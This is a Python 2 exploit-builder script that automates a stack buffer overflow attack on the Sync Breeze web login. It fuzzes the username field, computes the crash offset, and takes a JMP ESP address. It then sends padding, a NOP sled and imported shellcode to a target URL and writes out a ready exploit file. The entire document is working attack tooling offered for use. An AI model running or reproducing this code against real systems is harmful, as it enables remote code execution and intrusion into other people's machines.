#!/usr/bin/env python2


import random
import string 
import time
from shell_code import shell_code 
import fileinput
from Banner import *
import shutil
import readline
import requests
import os
import sys

W='\033[0m'     
R='\033[31m'    
G='\033[0;32m'  
O='\33[37m'     
B='\033[34m'    
P= '\033[35m'   
Y="\033[1;33m"   

class Sync_Breeze():
    
     def __init__(self):
            global W
            global R
            global G
            global O
            global B
            global P
            global Y          
            time.sleep(2)
            print Y+"\n[A]"+W+R+"* buffer_Helper Start Sync Breeze  mode * "+W+Y+"[C]"+W
            self.web_req()
            self.Fuzzing__()
            self.string_ramdon()
            self.connect_servser()
            self.Option_return()
            self._hexadecimal() 
            self.little_endian()        
            self.attack_all()
            self.auto_write()
     def web_req(self):
            try:
            	session = requests.session()
                self.target_url=str(raw_input(O+"\n[+]"+W+B+"Target Url : "+W))
                response = session.get(self.target_url,timeout=5)
                if response.ok == True:
                     pass
                else:
                     print Y+"\n[#]"+W+R+"Please Check Service" +W+Y+"[#]"+W
                     time.sleep(2)
                     print Y+"\n[#]"+W+R+"Please Check Service" +W+Y+"[#]"+W      
            except Exception:
                print Y+"\n[#]"+W+R+"Service Not Runing" +W+Y+"[#]"+W 
                return  self.web_req()    
            except KeyboardInterrupt:
                print Banner
                exit()
    
     def Fuzzing__(self):       				
          try:                
                self.Fuz_skip = 's'.lower() 
                self.Fuz_OPt  = "y".lower()  
                time.sleep(2)           
                print O+"\n[F]"+W+Y+" Fuzzing Option "+W+O+"[?]"+W
                time.sleep(2) 
                self.Fuzzing_in = str(raw_input(O+"\n[$]"+W+B+"To Start Fuzzing Enter" +W+R+"'Y'" +W+B+ "To skip Fuzzing Enter" +W+R+"'S'"+W+B+' : '+W))               
                if self.Fuzzing_in ==self.Fuz_skip and len(self.Fuzzing_in)==1:
                     pass
                
                elif self.Fuzzing_in ==self.Fuz_OPt and len(self.Fuzzing_in)==1:
                    session = requests.session()
                    String = "A"
                    Fuzzer = 100
                    password = 'admin'
                    print O+"\n>>>>"+W+R+"Fuzzing in process "+W 
                    try:
                        try:
                            while True: 
                                 data={ 
                                 'username': '{}'.format(String*Fuzzer),
                                 'password':'{}'.format(password),
                                 'user-agent':'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'
                                 }
                                 response = session.post(self.target_url,data=data,timeout=3)
                                 Fuzzer  +=100
                                 time.sleep(1)
                                 print B+"###--> "+W,Fuzzer   
                                 sys.stdout.write('\x1b[1A')
                                 sys.stdout.write('\x1b[2K') 
                                                         
                        except:
                             print O+"\n>>>>>"+W+P+"Fuzzing Stop at " +W+Y+str(Fuzzer)+W+ R+ " Characters"+W 
                    except KeyboardInterrupt:
                        print  Banner
                        exit() 

                    try:
                        input= raw_input(O+"\n[]>>>>>>"+W+R+"Please Restart the Application then Press any key to Continue"+W+O+"<<<<<<<[]"+W)
                    except NameError:
                           pass	                                                        
                    self.Random_String = "".join(random.choice(string.ascii_letters)for i in range(int(Fuzzer))).lower()  
                    self.Random_String = bytearray(self.Random_String)
                    time.sleep(2)
                    print Y+"\n[+]"+W+R+"String Pattern is Generated in length :"+W,len(self.Random_String )#,"\n\n",(self.Random_String).strip()
                    time.sleep(2)  
                    if self.Random_String  > 0:
                           self.connect_servser() 
                           self.Option_return()
                           self._hexadecimal() 
                           self.little_endian()        
                           self.attack_all()
                           self.auto_write()   
                                                                                                                                                                          
                else:         
                   time.sleep(2)    
                   print Y+"\n[-]"+W+R+"please Enter "+W+B+"'Y'"+W+R+"or"+W+B+"'S'"+W+Y+" [-]"+W 
                   return self.Fuzzing__()             
          except KeyboardInterrupt:
                    print  Banner
                    exit()
                   
     def string_ramdon(self):        
             try:                      
	 	    Requst_String = int (raw_input(O+"\n[+]"+W+B+"Enter the length of Pattern :"+W))
		    time.sleep(2)
		    self.Random_String = "".join(random.choice(string.ascii_letters)for i in range(Requst_String )).lower()  
                    self.Random_String = bytearray(self.Random_String)
		    print Y+"\n[+]"+W+R+"String Pattern is Generated in length :"+W,len(self.Random_String )#,"\n\n",(self.Random_String).strip()
             except Exception:
                    time.sleep(2)
                    print Y+"\n[()]"+W+R+"Check input integer Required"+W+Y +"[()]"+W
                    return self.string_ramdon()		 
             except KeyboardInterrupt:
                    print  Banner
                    exit()                 		 
 
     def connect_servser(self):
        try:
            session = requests.session()
            response = session.get(self.target_url)
            if response.ok == True:
     	       while True:
                    try:
                       session = requests.session()
                       password = 'admin' 
                       data={ 
                       'username': '{}'.format(self.Random_String),
                       'password':'{}'.format(password),
                       'user-agent':'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'
                       }
                       response = session.post(self.target_url,data=data,timeout=3)
                          
                    except :
                 	   print Y+"\n[+]"+W+R+"Data Send Successful"+W+Y+"...!!!"+W
                 	   time.sleep(2)
                 	   print Y+"\n[+]"+W+R+"please Restart The Service"+W+Y+"...!!!"+W
                 	   break
            else:
                print O+"\n***_***_"+W+R+"[:::::'Connection Error :::::']"+W+O+"+***_***"+W 
                print Y+"\n[+]"+W+w+"please Restart The Service and try agin"+W+Y+"...!!!"+W  	   
                self.connect_servser()    
        except KeyboardInterrupt:
            print  Banner
            exit()
     def Option_return(self):
       
           try:
               continue_1   = "c".lower()            
               return_back  = "b".lower()
               op_sel = str(raw_input(Y+"\n[<>]"+W+R+"To Continue Press "+W+B+"C "+W+R +"To Return Back Press "+W+B+" B : "+W)).lower()
               if op_sel== continue_1 and  len(op_sel)==1:
                    pass
                    
               elif op_sel ==return_back and len(op_sel)==1:
                    self.string_ramdon()
                    self.connect_servser()
                    self.Option_return()
               else:
                  print Y+"\n[-]"+W+R+"Please Enter "+W+B+"C"+W+R+"or"+W+B+" B"+W+Y+" [-]"+W 
                  self.Option_return()
           except KeyboardInterrupt:
                   print  Banner
                   exit()
                               
     def _hexadecimal(self):
                                                                                   
          while True:
                 try: 
		    self.hexadecimal =str(raw_input(O+"\n[+]"+W+B+"Enter Hexadecimal Crach address: "+W)).upper()
                    self.ASCII1 ="".join(reversed([self.hexadecimal[i:i+2] for i in range(0, len(self.hexadecimal), 2)]))                
		    self.ASCII = ''.join(chr(int(self.ASCII1[i:i+2], 16)) for i in range(0, len(self.ASCII1), 2))
		    if  self.ASCII in  self.Random_String and len(self.ASCII)==4:
		       time.sleep(2)
		       print Y+"\n[+]"+W+P+"The ASCII Value  is "+W+B+": "+W,R+self.ASCII+W
		       time.sleep(2)
		       self.location = self.Random_String.find(self.ASCII)		       
		       print Y+"\n[+]"+W+P+"Exact Satch at Offset"+W+B+" : "+W,self.location	              
                       break
		    else:
	               print Y+"\n[(*)]"+W+R+"THE VALUE  OF THE ADDRESS Not FOUND  IN OUR STRING"+W+Y+"[(*)] "+W
	               time.sleep(2)
	               return self._hexadecimal() 
	                
	         except Exception:
	               print Y+"\n[(*)]"+W+R+"THE VALUE  OF THE ADDRESS Not FOUND "+W+Y+"[(*)] "+W  
	               return self._hexadecimal()                  
		     
	        
                 except KeyboardInterrupt:
                       print  Banner
                       exit() 
         
     def little_endian(self):
         
               try:
                    jump= str(raw_input(O+"\n[+]"+W+B+" Enter JMP ESP addrsss HEX  : "+W)).upper()
                    time.sleep(2)
                    self.jump_address = "".join(reversed([jump[i:i+2] for i in range(0, len(jump), 2)]))
                    self.display =self.jump_address# for print olnly
                    self.display = " ".join('\\x%s'%self.display[i:i+2] for i in range(0, len(self.display), 2))
                    self.display= self.display.replace(" ", "")
                    time.sleep(2)
                    self.jump_address = ('0'*(len(self.jump_address) % 2) +self.jump_address).decode('hex') 
                    print Y+"\n[+]"+W+P+"little endian JMP ESP  is "+W+B+": "+W,R+self.display+W
               except Exception:
	               print Y+"\n[(*)]"+W+R+"TypeError: Non-hexadecimal digit found "+W+Y+"[(*)] "+W  
	               return self.little_endian()                       
               except KeyboardInterrupt:
                    print  Banner
                    exit()
                                
     def attack_all(self):
	     
	       try: 	                     
                   Start_string = self.location*"A"        
                   self.NO_Operation = len(self.Random_String) - self.location  - len( self.jump_address)
                   self.NO_Operation =self.NO_Operation*"\x90"
                   self.count = self.NO_Operation.count("\x90")    
                   attack = Start_string+self.jump_address+ self.NO_Operation +shell_code 
                   time.sleep(2)
                   print Y+'\n[+]'+W+B+' attack'+W+O+' ='+W,len(Start_string),B+'of'+W+R+ " A "+W+O+' + '+W+B+\
                   ' JMP ESP ='+W,Y+ self.display+W ,O+'+'+W,self.NO_Operation.count("\x90"),B+'of'+W+R+'("\\x90")'+W+O +'+'+W+P+' shell code'+W
                   time.sleep(2)
                   print Y+"\n[+]"+W+R+"Target URL "+W+O+ " : "+W, P+self.target_url+W
                   time.sleep(2)
                   session = requests.session()
                   response = session.get(self.target_url)
                   if response.ok == True:
                         try:
                            while True:
                              session = requests.session()
                              password = 'admin' 
                              data={ 
                              'username': '{}'.format(attack),
                              'password':'{}'.format(password),
                              'user-agent':'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'
                              }
                              response = requests.post(self.target_url,data=data,timeout=3) 
                                          
                         except Exception :
                             print B +"\n[+]"+W+R+"WE READY TO ATTACK !!"+W+B+"[+]"+W 
                             time.sleep(2)
                             print Y+"\n[+]"+W+R+"________________Expolit Done _______________ "+W+B+"***!!!"+W 
                            
                   else:                 
                       print O+"\n[(!)]"+W+Y+"Connection is Down >> requests.exceptions.ConnectionError"+W
                       print  Banner          
               except KeyboardInterrupt:
                   print  Banner
                   exit()  
                   
     def auto_write(self): 
              
                try:                
                  shell =shell_code.encode("hex")
                  shell1= "".join("\\x%s"%shell[i:i+2] for i in range(0, len(shell), 2))
                  self.shell_code= "".join('\n"%s"'%shell1[i:i+56] for i in range(0, len(shell1),56))
                  copy_format= shutil.copy("./SyncBreeze_payload.txt","./SyncBreeze_payload.py") 
                     
                  file="./SyncBreeze_payload.py"
                  for line in fileinput.FileInput(file,inplace=1):
	                if '# application name :'in line:
		            line = line.rstrip()
		            line = line.replace(line,line+ 'Sync Breeze' +'\n')
				 
	                if '_Offset_Byte  =  "A"*'in line:
		            line = line.rstrip()
		            line = line.replace(line,line+ str(self.location)+'\n')
				 
		        if '_JMP_ESP      ='in line:
		            line = line.rstrip()
		            line = line.replace(line,line+'"'+ self.display+'"'+'\n')
				 
	                if '_NO_OPT       = "\\x90"'in line:
		            line = line.rstrip()
		            line = line.replace(line,line+ str(self.count) +'\n')
		        if '_Shell_Code   = ('in line:
		             line = line.rstrip()
		             line = line.replace(line,line+ self.shell_code+ ')'+'\n') 
			     
		        if 'Target_Url ='in line:
		            line = line.rstrip()
			    line = line.replace(line,line+'"'+self.target_url+'"'+"\n") 
					   
		        print line,
		        
                  time.sleep(2)
		  print O+"\n <<<<>>>>>>"+W+R+"The Final Process of this Exploit Written in the File"+W+Y+"'SyncBreeze_payload.py'"+W+O+"<<<>>>> "+W 
		  time.sleep(2)     
                  print   Banner
                  exit() 
                except KeyboardInterrupt:    
                     print   Banner                              	
                     exit()

		          
if __name__ == '__main__':
   Sync_Breeze()
